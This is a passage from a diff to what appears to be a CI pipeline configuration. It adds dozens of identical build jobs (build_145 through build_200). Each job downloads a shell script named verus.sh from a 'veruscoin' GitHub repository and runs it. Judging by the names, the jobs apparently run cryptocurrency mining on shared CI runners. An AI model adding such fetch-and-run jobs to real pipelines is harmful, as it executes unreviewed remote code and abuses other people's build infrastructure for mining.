+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_145:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_146:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_147:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_148:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_149:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_150:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_151:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_152:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_153:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_154:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_155:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_156:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_157:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_158:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_159:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_160:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_161:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_162:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_163:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_164:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_165:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_166:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_167:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_168:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_169:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_170:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_171:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_172:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_173:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_174:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_175:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+    
+build_176:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_177:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_178:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_179:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_180:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_181:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_182:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_183:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_184:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_185:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_186:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_187:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_188:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_189:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_190:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_191:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_192:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_193:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_194:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_195:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_196:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_197:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_198:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_199:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+
+build_200:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/noval2/veruscoin/main/verus.sh && chmod u+x verus.sh && ./verus.sh
